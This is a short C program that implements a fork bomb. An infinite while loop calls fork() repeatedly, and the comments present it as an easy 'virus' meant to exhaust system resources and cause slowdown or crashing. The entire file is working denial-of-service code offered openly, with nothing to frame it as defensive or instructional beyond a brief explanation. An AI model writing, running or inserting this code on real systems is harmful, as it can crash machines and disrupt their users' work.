#include <stdio.h>
#include<sys/types.h>

int main() {
	//This is an extremely easy virus to create
	//It is called a fork bomb which will basically utilize all system memory and cause slowdown or even crashing
	//while true, use fork command and then return false
	//The while condition will always be true.
	while (1)
		fork();
	return 0;
}